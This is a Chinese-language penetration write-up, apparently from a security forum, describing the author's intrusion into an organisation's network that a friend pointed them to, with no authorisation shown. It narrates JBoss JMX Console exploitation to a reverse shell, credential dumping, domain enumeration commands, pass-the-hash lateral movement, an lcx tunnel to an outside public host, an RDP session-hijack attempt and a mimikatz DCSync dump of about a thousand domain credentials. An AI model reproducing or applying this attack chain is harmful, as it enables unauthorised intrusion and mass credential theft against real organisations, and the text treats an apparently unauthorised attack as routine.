前言
--

最近闲来无事,朋友说有个站叫我去看看。由于是实战,厚马见谅。

web打点
-----

上来就是一个jboss界面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce895e6e789166f4ea8c15c9c209e0a0e1418e6b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce895e6e789166f4ea8c15c9c209e0a0e1418e6b.png)

随手一点,`JMX Console`竟然可以直接进。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-13070715848522164356903b4bcef928f68ded4b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-13070715848522164356903b4bcef928f68ded4b.png)  
这里最经典的玩法就是war包的远程部署

找到`jboss.deployment`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-69df9d286683739ccc90d925c235d15d0eb2d137.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-69df9d286683739ccc90d925c235d15d0eb2d137.png)

进入后找到`void addURL()`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1f8b559c040f1cc53db508560e0cebf00a279a68.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1f8b559c040f1cc53db508560e0cebf00a279a68.png)  
这里网上有很多文章写这个玩法,这里就不复现了。

而前辈们早已写出了集成化工具,放到脚本工具上跑一下看看

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5cf7fe30b84211ee92bf4ef9e772b9843fe755cd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5cf7fe30b84211ee92bf4ef9e772b9843fe755cd.png)

脚本显示有两个漏洞,其中一个就是`JMX Console`,直接让脚本跑一下试试。

直接反弹了一个shell  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c94a7fa7872684393c1b3d8eb68460a52b0f66db.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c94a7fa7872684393c1b3d8eb68460a52b0f66db.png)

由于这个shell比较脆弱,这里大致查查进程(无AV),看看管理员登录时间和网卡信息等等。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71ec95fc373a2db7516d3a99692f17a3e6e17901.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71ec95fc373a2db7516d3a99692f17a3e6e17901.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a58d9a4e62a7ac01854e79d2325ca7adc9222e74.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a58d9a4e62a7ac01854e79d2325ca7adc9222e74.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15acceaa838ca196c38671428756fdf248b79397.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15acceaa838ca196c38671428756fdf248b79397.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c683dbfcf6cd7ea867581fa1fe71a1caa3f47c0c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c683dbfcf6cd7ea867581fa1fe71a1caa3f47c0c.png)

可以看到是有域的

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4312bd28148b1cd439989a07debaaf285ab561f7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4312bd28148b1cd439989a07debaaf285ab561f7.png)

大致了解了情况后就想直接走后渗透,ping下度娘看下机器出不出网。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd71ebce748da2af1f43b0a5d35276e2595cb2c5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd71ebce748da2af1f43b0a5d35276e2595cb2c5.png)  
是出网的,由于是国外的机器ping就比较高,由于无杀软,所以准备直接powershell上线

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a9bc48897fa34ac322d948148f6d161d596f34f7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a9bc48897fa34ac322d948148f6d161d596f34f7.png)  
因为后来发现域很大,派生了一个会话来操作。

后渗透
---

### 本机信息收集

权限很高,上来先把hash抓到,心安一点。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2fe287e7a7eabba78505ff1970a6525dfc0e4b9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2fe287e7a7eabba78505ff1970a6525dfc0e4b9.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cbd5d780a8306f482a61529ee8647f3626dfe025.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cbd5d780a8306f482a61529ee8647f3626dfe025.png)

一开始没注意仔细看,这里已经发现当前主机所在的域名

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-80faaff2715533e78fae2686741359ffe33b22b7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-80faaff2715533e78fae2686741359ffe33b22b7.png)

由于是在域中,通过dns大致定位域控ip  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b14e9a7847ff6699fd77dc48a139bfb3e6d3073f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b14e9a7847ff6699fd77dc48a139bfb3e6d3073f.png)

不急着打域控,先做一波信息收集

### 域内信息收集

查询域数量  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-adac5458191155473eb64a3d38d1fc4890d71674.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-adac5458191155473eb64a3d38d1fc4890d71674.png)

查询域内计算机列表  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3fe4ec37b4cf8fa0459e267dd4e4f121c68f6fbc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3fe4ec37b4cf8fa0459e267dd4e4f121c68f6fbc.png)

查询域管账户`net group "domain admins" /domain`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75e85e519bb3b93f09457363b7b8dd00dfde6754.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75e85e519bb3b93f09457363b7b8dd00dfde6754.png)

查询域控账户`shell net group "domain controllers" /domain`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0b6f87373bbff178127d8866208fef5c7798a151.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0b6f87373bbff178127d8866208fef5c7798a151.png)

这里04和53的后缀和刚刚DNS的后缀是一样的,确认域控机器和账户

查询域内用户`shell net user /domain`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4e2121985cde67e78122477cd9b33470085e8d5d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4e2121985cde67e78122477cd9b33470085e8d5d.png)

这一个域大概是三四百个用户账号,还是比较大的

查询域所用主机名`shell net group "domain computers" /domain`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e62ab9d12c640f8430ca7f8656bbe25fa4813014.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e62ab9d12c640f8430ca7f8656bbe25fa4813014.png)  
主机也有一百多台

`shell net accounts /domain`查看域账户属性,没有要求强制更改密码

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-092149a46d5f0d6a060145a848fc92c7968e9b0b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-092149a46d5f0d6a060145a848fc92c7968e9b0b.png)

`shell nltest /domain_trusts`域信任信息

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b31ca43a4e7bc31d14d1b8d26f40c4b00b388b28.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b31ca43a4e7bc31d14d1b8d26f40c4b00b388b28.png)

`shell net group /domain`查看域中组信息  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-04e900f20291d9ca570cae1c8efc0e4fc4af1252.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-04e900f20291d9ca570cae1c8efc0e4fc4af1252.png)

`net use`查看是否有ipc连接,`net share`查看共享  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1d058569dfc996f67ca11a2368e4b929d55fdd3e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1d058569dfc996f67ca11a2368e4b929d55fdd3e.png)

但是这里`net session`有几台,这是其他主机连接本机的ipc连接  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b70053c19c0b4619d988d240ac53a817fa1ef266.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b70053c19c0b4619d988d240ac53a817fa1ef266.png)

### spn扫描

机器在域内了,spn是不得不看一下的,比起端口扫描更精确,也更加隐蔽,这是由于SPN扫描通过域控制器的LDAP进行服务查询,而这正是Kerberos票据行为的一部分。  
windows自带了一款工具:setspn  
`shell setspn -T xxxx -Q */*`

这里就可以看到28机器有MSSQL服务,开启1433端口  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7ed23ba0174875871118b03d51a8df33b66fa27f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7ed23ba0174875871118b03d51a8df33b66fa27f.png)

这里服务确实有点太多了,为了方便就将结果输出到文本  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6107fa1a96d354b76eed4d556a32a91b6f8dd56.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6107fa1a96d354b76eed4d556a32a91b6f8dd56.png)

将主机名列出  
`grep "CN=" spn.txt | awk -F "," {'print $1'} | awk -F "=" {'print $2'} > host.txt`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15066b9789771f9a5791a4895b0a433d482ff553.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15066b9789771f9a5791a4895b0a433d482ff553.png)

### 横向移动

上来先试试pth域控,无果,又尝试扫描MS17010,也没有洞,只能去先横向其他的主机。通过上面net session,发现一个与当前主机用户名相同的账户名称,尝试psexec传递hash  
拿下该主机

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8b159b6c09df0c8d34298d25202062f61186bdc2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8b159b6c09df0c8d34298d25202062f61186bdc2.png)

这个session有一个作用就是盗取令牌,创建更高权限账户的进程,比如域管的cmd这种,但是这里我对比了net session的用户名和域管用户的用户名,发现没有一个是相同的,这个方法也就不去尝试了。

批量扫一波MS17010,这个域的防御性比较高,只有零星几台有漏洞。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6d52d78e9a0a0250b98e538ecbab412eff9865dd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6d52d78e9a0a0250b98e538ecbab412eff9865dd.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6be99a3239ff133d18a3c2b6052c092a40f77cc4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6be99a3239ff133d18a3c2b6052c092a40f77cc4.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e74a27c34e6aaf1a084b5ead5540cf6ad8874e51.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e74a27c34e6aaf1a084b5ead5540cf6ad8874e51.png)

并且同网段没有,只有0,2,3段各一台,这里就像先把他们都先拿下,看OS版本应该是没问题的,准备派生会话给msf去打。

MS17010
-------

cs上还是不太好打,派生个会话给msf。我的vps是windows server的,一开始下了个windows版的msf在vps上,但是添加路由的时候一直说我参数不对,就不知道咋回事。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-93499d1aec1a15c5519cb968b382024672bf639a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-93499d1aec1a15c5519cb968b382024672bf639a.png)  
还是算了,就搞个代理到本机用虚拟机kali吧。我用的是frp,vps当server,虚拟机当client

vps配置`frps.ini`  
配一个端口  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2445a6763987eba4104a7897e0e53b8559fad69a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2445a6763987eba4104a7897e0e53b8559fad69a.png)

kali配置`frpc.ini`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1fec884c65fda7c0c57c5d2ad2614fd4ff735bd6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1fec884c65fda7c0c57c5d2ad2614fd4ff735bd6.png)

然后vps上命令行启动frps.exe  
`frps.exe -c frps.ini`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-36b6399e9f46a9a900d8a34b7b154289a61afad9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-36b6399e9f46a9a900d8a34b7b154289a61afad9.png)

kali执行  
`frpc.exe -c frpc.ini`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1de91793d54bd96804795d92d13144dbfb40953c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1de91793d54bd96804795d92d13144dbfb40953c.png)  
这样就可以愉快的派生会话了,但是这里最后打的时候三台主机没一台能打下来。首先三台主机都没有开启管道,只能用eterblue模块,最后也没成功,这个域系统安全性还是比较高的。

pth
---

没办法,系统漏洞一台拿不了,但是通过端口扫描发现大量主机开启445端口,于是还是先pass the hash

批量撞一波  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2bb244b6021ebb2121beed96e7c48e03877b361.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2bb244b6021ebb2121beed96e7c48e03877b361.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1d3dbc3877fa744ab33bebf3080ce928ce412213.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1d3dbc3877fa744ab33bebf3080ce928ce412213.png)

断断续续拿下不少主机  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e661b50d5a26b421dbfd04ee1bd64f3c704a87e0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e661b50d5a26b421dbfd04ee1bd64f3c704a87e0.png)

这时就一台一台的信息收集

rdp劫持会话
-------

在27这台主机上发现,有两个会话,上面是我们已知账号和明文密码的普通域内账户,而下面这个用户经过比对,为域中域管用户。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fa8fa556f29abf3915a077381ed238c11d213bc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fa8fa556f29abf3915a077381ed238c11d213bc.png)

由于我们自身权限也高,这里就想rdp上去劫持该会话(当时打的时候比较激动,没注意看这个会话是失效的,这里还是记录一下)  
看眼时间,应该在休息呢  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-17faf60a2692d082d44f72bb26500a5833bcad0d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-17faf60a2692d082d44f72bb26500a5833bcad0d.png)

lcx设置代理  
目标机器上  
`shell C:\Windows\system32\lcx.exe -slave 公网ip 7212 127.0.0.1 3389`  
vps上  
`lcx -listen 7212 5555`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ebb0bfc16d02112e90f3282a8c4fa3369e880894.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ebb0bfc16d02112e90f3282a8c4fa3369e880894.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-08fef31f49fd0170f5b226775c2e2b6df7802b3f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-08fef31f49fd0170f5b226775c2e2b6df7802b3f.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2f51120e19eb8d7dee1b808a29c40bdf730fae7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2f51120e19eb8d7dee1b808a29c40bdf730fae7.png)

在cs上执行`shell tscon 2`  
他说没有权限。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-78f7162e2950a0de59fcae8f367361ff661ed610.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-78f7162e2950a0de59fcae8f367361ff661ed610.png)

在目标机器执行的时候提示错误的密码,猜想大概是会话断联的原因。如果STATE是active应该是没问题的。

拿下DC
----

将所有拿下的主机的hash全部dump出来,整合后发现有Administrator的账户hash,且是域中账户,而在域中Administrator是作为域管账户的。  
445端口开启  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4d9765a149145de85162ed5dbfad96fe3e18a6fb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4d9765a149145de85162ed5dbfad96fe3e18a6fb.png)

尝试pth  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-caad50bf6ea210e9c3b3ab65a41a1572578f7c3f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-caad50bf6ea210e9c3b3ab65a41a1572578f7c3f.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-182092bb9b7c650aecf4b02a428f53cdb239dad5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-182092bb9b7c650aecf4b02a428f53cdb239dad5.png)  
失败了,如果不能pth这个hash将索然无味,又不能拿到明文  
这里搞了很久,然后又回去信息收集。  
搞来搞去搞了很久,还是那么7、8台主机,最后也是没办法,由于抓到了很多密码,把所有Administrator用户的hash全部pass了一遍,终于拿下了域控

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8b7a3d7507a1a5c0ff1ff54f260cfa8f70e662d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8b7a3d7507a1a5c0ff1ff54f260cfa8f70e662d.png)

导出ntds,抓下密码,这里使用mimikatz  
`lsadump::dcsync /domain:xxx /all /csv command`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a74a8183daee88b9ef89a399d3e8621eece76758.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a74a8183daee88b9ef89a399d3e8621eece76758.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b54c7f125d31a8c949980cc7f3490cd5f05d7f89.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b54c7f125d31a8c949980cc7f3490cd5f05d7f89.png)

将近一千个用户,RDP他们好像随时都是连着的。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-84f8a8f01ddc13603590f100c3cac5d9d8e0f1d3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-84f8a8f01ddc13603590f100c3cac5d9d8e0f1d3.png)

想3389上去看一下,找一个没有连接的用户

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9d6cd435881942e197108503ea0f64a3dbeb3970.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9d6cd435881942e197108503ea0f64a3dbeb3970.png)

找到该用户的hash拿去解密

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-263bec41c65b9502b923d053f300a5a23ad2f516.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-263bec41c65b9502b923d053f300a5a23ad2f516.png)

成功连接

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c3cc272f5b76851cdcef67cd93efbd097cb15200.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c3cc272f5b76851cdcef67cd93efbd097cb15200.png)

ENDING...
---------